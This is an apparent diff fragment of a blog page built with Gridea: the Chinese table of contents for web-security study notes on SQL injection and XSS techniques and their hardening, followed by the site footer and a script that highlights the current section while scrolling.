+<li><a href="#5-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8">5、获取数据库中的表</a></li>
+<li><a href="#6-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D">6、获取当前表中字段名</a></li>
+<li><a href="#7-%E4%B8%8B%E8%BD%BD%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF">7、下载数据（获取字段信息）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#iii%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5%E5%BE%85%E6%B5%8B%E8%AF%95">Ⅲ：使用sqlmap注入（待测试）</a>
+<ul>
+<li><a href="#1-sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">1、sqlmap使用教程</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96sql%E6%B3%A8%E5%85%A5">其他sql注入</a>
+<ul>
+<li><a href="#1-sql%E7%9B%B2%E6%B3%A8">1、sql盲注</a><br>
+*
+<ul>
+<li><a href="#%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><strong>手工盲注常用参数</strong></a></li>
+<li><a href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">布尔盲注</a>
+<ul>
+<li><a href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0">手工注入实现：</a></li>
+<li><a href="#sqlmap%E5%AE%9E%E7%8E%B0%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5">sqlmap实现布尔注入</a></li>
+</ul>
+</li>
+<li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">时间盲注</a>
+<ul>
+<li><a href="#%E6%89%8B%E5%B7%A5%E5%AE%9E%E7%8E%B0">手工实现：</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#2-dnslog%E6%B3%A8%E5%85%A5%E6%9C%89%E5%BE%85%E5%AD%A6%E4%B9%A0">2、DNSlog注入（有待学习）</a>
+<ul>
+<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a></li>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+</ul>
+</li>
+<li><a href="#3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">3、宽字节注入</a>
+<ul>
+<li><a href="#%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95">手工测试：</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8sqlmap">使用sqlmap：</a></li>
+</ul>
+</li>
+<li><a href="#4-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E9%9C%80%E8%A6%81%E8%A1%A5%E5%85%85">4、报错注入（需要补充）</a>
+<ul>
+<li><a href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">floor报错注入/双查询注入</a></li>
+<li><a href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">updatexml报错注入</a></li>
+<li><a href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">extractvalue报错注入</a></li>
+</ul>
+</li>
+<li><a href="#5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">5、二次注入</a>
+<ul>
+<li><a href="#%E6%9C%89%E5%BE%85%E5%AD%A6%E4%B9%A0-">有待学习--=</a></li>
+</ul>
+</li>
+<li><a href="#6-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">6、堆叠注入</a></li>
+<li><a href="#7-http-head%E6%B3%A8%E5%85%A5">7、http head注入</a>
+<ul>
+<li><a href="#cookie%E6%B3%A8%E5%85%A5">cookie注入</a></li>
+<li><a href="#xff%E6%B3%A8%E5%85%A5">XFF注入</a></li>
+<li><a href="#ua%E6%B3%A8%E5%85%A5">UA注入</a></li>
+</ul>
+</li>
+<li><a href="#8-%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6">8、读写文件</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95">靶场记录</a></li>
+<li><a href="#iv%E5%8A%A0%E5%9B%BAsql">Ⅳ：加固sql</a></li>
+<li><a href="#%E9%99%84%E4%BB%B6">附件</a>
+<ul>
+<li><a href="#sql%E6%B3%A8%E5%85%A5">sql注入</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8Cxss%E6%B3%A8%E5%85%A5">二：xss注入</a><br>
+*<br>
+*<br>
+* <a href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86">攻击原理</a>
+<ul>
+<li><a href="#%E4%B8%BB%E8%A6%81%E5%88%86%E4%B8%BA%E4%B8%89%E5%A4%A7%E7%B1%BB">主要分为三大类</a>
+<ul>
+<li><a href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss">1、反射型xss</a></li>
+<li><a href="#2-%E5%AD%98%E5%82%A8%E5%9E%8Bxss">2、存储型xss</a></li>
+<li><a href="#3-dome%E5%9E%8Bxss">3、dome型xss</a></li>
+</ul>
+</li>
+<li><a href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95">手动测试</a><br>
+*
+<ul>
+<li><a href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8B">1、反射型</a></li>
+<li><a href="#2-%E5%AD%98%E5%82%A8%E5%9E%8B">2、存储型</a></li>
+<li><a href="#3-dom%E5%BD%A2xss">3、dom形XSS</a></li>
+<li><a href="#4-xss%E7%9B%B2%E6%89%93">4、XSS盲打</a></li>
+<li><a href="#5-xss%E8%BF%87%E6%BB%A4">5、XSS过滤</a></li>
+<li><a href="#6-xss%E4%B9%8Bhtmlspecialchars">6、<strong>xss之htmlspecialchars</strong></a></li>
+<li><a href="#xss%E5%8A%A0%E5%9B%BA">xss加固</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E9%99%84%E4%B8%8A">附上</a>
+<ul>
+<li><a href="#%E4%B8%80-mysql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0">一、MySql注入常用函数</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaoguai69.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
